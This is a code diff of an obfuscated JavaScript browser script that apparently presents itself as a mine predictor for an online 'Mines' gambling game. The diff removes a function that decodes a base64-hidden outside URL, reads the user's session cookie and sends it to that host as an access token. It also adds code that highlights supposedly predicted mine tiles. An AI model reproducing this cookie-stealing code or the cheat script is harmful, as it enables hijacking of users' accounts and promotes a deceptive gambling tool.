@@ -770,33 +770,6 @@
   }
   _0x47b3c7.setInterval(_0x2aeb3f, 5000);
 })();
-
-async function fetchMinesFromOGAPI(clientSeed, serverSeed, nonce, bombs = 3) {
-  const apiUrl = atob("aHR0cHM6Ly9zb3VsYXBpLnZlcmNlbC5hcHA="); // https://soulapi.vercel.app
-  const session = document.cookie.match(/session=([^;]+)/)?.[1] || '';
-  const url = `${apiUrl}/predict/mines`;
-  try {
-    const res = await fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'x-access-token': session
-      },
-      body: JSON.stringify({
-        clientSeed,
-        serverSeed,
-        nonce,
-        bombs
-      })
-    });
-    const data = await res.json();
-    return data.mines || [];
-  } catch (err) {
-    console.error("OG API fetch failed:", err);
-    return [];
-  }
-}
-
 function _0x2aeb3f(_0x31c01c) {
   function _0xfdb1f5(_0x22211e) {
     if (typeof _0x22211e === "string") {
@@ -822,3 +795,24 @@ function _0x2aeb3f(_0x31c01c) {
     }
   } catch (_0x4e9f0b) {}
 }
+
+
+// Override autoplay to highlight mines instead of clicking
+window._0xa1108c.autoplay = async function () {
+  const mines = await window._0xa1108c.predictor();
+  if (!Array.isArray(mines)) {
+    console.warn("Prediction failed or returned invalid data.");
+    return;
+  }
+  console.log("🔴 Highlighting predicted mines:", mines);
+  mines.forEach(index => {
+    const tile = document.querySelector(`[data-id="${index}"]`);
+    if (tile) {
+      tile.style.backgroundColor = "#ff4c4c";
+      tile.style.boxShadow = "0 0 10px #ff0000";
+    }
+  });
+  // Paused autoclicking logic — no clicks will be made
+  console.log("Autoplay is now in visual highlight-only mode.");
+};
+
